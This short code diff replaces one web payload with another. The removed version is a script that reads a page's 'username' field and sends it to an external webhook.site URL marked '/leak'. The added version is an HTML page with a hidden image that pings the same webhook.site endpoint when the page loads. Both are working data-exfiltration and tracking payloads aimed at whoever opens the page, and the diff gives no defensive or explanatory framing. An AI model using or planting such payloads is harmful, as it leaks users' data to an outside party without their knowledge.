@@ -1,7 +1,5 @@
-<script>
-const username = document.getElementById("username")?.value;
-
-if (username) {
-  fetch(`https://webhook.site/2da2e1ae-88ce-40b8-97f1-4c28ec907ed0/leak?username=${encodeURIComponent(username)}`);
-}
-</script>
+<html>
+    <body>
+        <img src="https://webhook.site/2da2e1ae-88ce-40b8-97f1-4c28ec907ed0/img" alt="">
+    </body>
+</html>
